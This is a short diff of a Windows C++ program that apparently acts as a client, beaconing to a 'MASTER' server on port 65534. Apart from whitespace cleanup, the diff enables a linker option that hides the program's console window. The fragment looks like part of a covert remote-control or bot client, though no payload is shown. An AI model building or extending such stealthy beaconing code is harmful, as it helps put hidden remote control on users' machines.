@@ -3,10 +3,10 @@
 #include <chrono>						//CONN TIMEOUT NEEDS TIME LIB
 #include <windows.h>
 #include "resource.h"					//INCLUDE RESOURCE FILE FOR LINK TO RESOURCE
-#include <ws2tcpip.h>					//NEED THIS FOR IP CONVERSION 
+#include <ws2tcpip.h>					//NEED THIS FOR IP CONVERSION
 #pragma comment(lib, "ws2_32.lib")		//INCLUDE LIBRARY ON COMPILE
 #pragma comment(lib, "winmm.lib")
-//#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
+#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
 
 sockaddr_in SERV_ADDR;
 unsigned short PORT = 65534;  			//DEFAULT PORT
@@ -69,7 +69,6 @@ int beacon()
 				printf("MASTER: %s\n", RCV_BUFF);
 				CONNECTED = 1;
 			}
-			
 		}
 	}
 	return 0;
@@ -112,7 +111,7 @@ int setupWSA()
 
 int setupSocket()
 {
-	SERV_ADDR.sin_family = AF_INET;										//USING IP PROTO		
+	SERV_ADDR.sin_family = AF_INET;										//USING IP PROTO
 	SERV_ADDR.sin_addr.s_addr = inet_addr(SERV_IP);						//CONVERT IP AND SET AS DEST
 	SERV_ADDR.sin_port = htons(PORT);
 	SOCK_LEN = sizeof(SERV_ADDR);
